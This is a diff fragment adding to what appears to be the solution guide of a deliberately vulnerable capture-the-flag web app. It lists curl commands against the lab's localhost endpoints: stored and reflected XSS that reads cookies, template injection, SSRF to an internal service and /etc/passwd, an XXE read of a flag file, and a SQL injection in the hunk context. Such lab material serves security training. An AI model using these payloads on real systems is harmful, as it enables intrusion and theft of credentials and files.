@@ -133,3 +133,37 @@ curl "http://localhost:4000/api/v1/products/search?category=-1%20UNION%20SELECT%
 curl -X POST http://localhost:4000/api/v1/reviews \
   -H "Content-Type: application/json" \
   -b cookies.txt \
+  -d '{"productId":1,"rating":5,"text":"<svg/onload=alert(document.cookie)>"}'
+
+# Reflected XSS
+# Visit: http://localhost:3000/product/<svg/onload=alert(1)>
+```
+
+#### Server-Side Template Injection
+```bash
+# Invoice SSTI (restricted evaluator)
+curl "http://localhost:4000/api/v1/invoice/1?note={{7*7}}"
+curl -G "http://localhost:4000/api/v1/invoice/1" --data-urlencode "note={{ flag }}"
+```
+
+#### SSRF
+```bash
+# Access internal service
+curl "http://localhost:4000/api/v1/proxy?url=http://internal-api:5000/secret"
+
+# File protocol bypass (case-sensitive)
+curl "http://localhost:4000/api/v1/proxy?url=File:///etc/passwd"
+```
+
+#### XXE
+```bash
+# Read file via XML entity
+curl -X POST http://localhost:4000/api/v1/admin/import \
+  -H "Content-Type: application/json" \
+  -H "x-admin: true" \
+  -d '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///app/secrets/flag.txt\">]><products><product>&xxe;</product></products>"}'
+```
+
+---
+
+## 🎌 Flag Locations
